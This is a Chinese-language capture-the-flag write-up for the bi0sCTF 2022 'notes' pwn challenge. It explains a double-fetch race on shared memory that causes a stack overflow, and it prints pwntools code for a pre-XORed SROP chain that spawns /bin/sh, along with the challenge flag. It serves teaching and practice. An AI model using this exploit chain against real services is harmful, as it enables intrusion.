# bi0sCTF 2022 - notes

## 题目简述

`notes` 是一个使用 System V 共享内存和两个 pthread 的笔记程序。菜单线程负责修改共享结构，工作线程在检测到 `size_input` 后调用 `process()`：先检查 `size<=64`，经过两次延时后再按共享的 `size` 把笔记复制到 64 字节栈缓冲区。两个线程没有锁，且 `thread2_done` 在第一次处理完成后再也不会重置，最终形成可控的 double-fetch 竞态和栈溢出。

程序是非 PIE 的 64 位 ELF，并额外提供了 `pop rdi; ret` 与 `syscall` gadget，适合在控制 RIP 后构造 SROP。

## 解题过程

### 找到检查与使用之间的竞态窗口

工作线程的关键逻辑如下：

```c
void process(sh_mem *ptr) {
    sleep(2);
    if (ptr->size > 64 || ptr->size < 0)
        exit(0);

    encrypt_text(ptr);
    char msg[64];
    sleep(1);
    memcpy(msg, ptr->buffer, ptr->size);
}
```

`size` 在检查和 `memcpy` 时分别从共享内存读取。第一次正常保存笔记后，线程 2 将 `thread2_done=true`；但下一轮开始时没有恢复为 false。此后菜单中的 `upgrade_note()` 可以在任意一轮处理期间修改 `size`：

```c
if (ptr->thread2_done == false)
    return;
scanf("%d", &ptr->size);
```

因此先用 `size=10` 触发第二轮，让线程 2 通过 `size<=64` 检查，再在一秒的窗口中执行 Upgrade，把共享尺寸改成 `1000`。`memcpy` 重新读取该值后，便会把共享缓冲区复制到 64 字节局部数组，覆盖保存的返回地址。

### 预先处理 XOR 缓冲区

菜单 5 会读入最多 1023 字节，再用固定 16 字节密钥异或整个缓冲区：

```c
char key[16] = "2111485077978050";
buffer[i] ^= key[i % 16];
```

因此不能直接发送 ROP；需要先在本地用同一密钥异或，程序再次异或后才会在共享内存中得到原始 payload：

```python
def xor_buffer(data):
    key = b"2111485077978050"
    return bytes(x ^ key[i % 16] for i, x in enumerate(data))
```

后续正常 Store Note 会覆盖缓冲区开头的少量字节，所以 payload 的前 72 字节本来就使用填充字符，短覆盖不会破坏 ROP 部分。

### 用 alarm 返回值触发 SROP

溢出偏移为 72 字节。利用链先调用程序自带的 `read_input`，把 `/bin/sh\0` 写入 `.bss`。接着借 `alarm` 的返回值把 `rax` 调成 15（`rt_sigreturn` 的系统调用号）：先设置一个短闹钟，再用 `alarm(0)` 取消，返回剩余秒数。随后执行 `syscall`，内核从栈上恢复伪造的 signal frame：

```python
frame = SigreturnFrame()
frame.rax = 59                  # execve
frame.rip = syscall
frame.rdi = elf.bss()           # "/bin/sh\0"
frame.rsi = 0
frame.rdx = 0

payload  = b"A" * 72
payload += p64(pop_rdi) + p64(elf.bss()) + p64(read_input)
payload += p64(pop_rdi) + p64(0xf) + p64(elf.sym.alarm)
payload += p64(pop_rdi) + p64(0) + p64(elf.sym.alarm)
payload += p64(syscall) + bytes(frame)
```

完整交互顺序为：

1. 用菜单 5 写入经过预异或的 SROP payload；
2. 保存一条小笔记并等待线程 2 完成，使 `thread2_done=true`；
3. 再保存一条 `size=10` 的笔记，触发下一轮 `process()`；
4. 在检查后、`memcpy` 前调用 Upgrade，把 `size` 改成 `1000`；
5. 第一次 `read_input` 被 ROP 调用时发送 `/bin/sh\0`。

竞态命中后得到 shell，flag 为：

```text
bi0sCTF{D3j4_vu!_1v3_ju5t_b33n_1n_th15_pl4c3_b3f0r3_0b91342067c4}
```

线程时序和 SROP 链也可对照 [官方赛后题解](https://blog.bi0s.in/2023/01/24/Pwn/bi0sCTF22-notes/)；正文已经说明了每一次等待对应的状态变化，避免把固定 `sleep` 数字当成漏洞本身。

## 方法总结

本题同时包含状态机错误和 TOCTOU：`thread2_done` 的陈旧真值让本不该开放的 Upgrade 路径持续可用，而 `size` 在检查与使用之间没有快照或锁，提供了 double-fetch 窗口。稳定利用时应围绕可观察状态安排两轮操作，而不是只盲调延时。拿到有限 ROP 后，非 PIE 的 `syscall` gadget与可控 signal frame 又把控制能力扩展为一次完整的 `execve`。
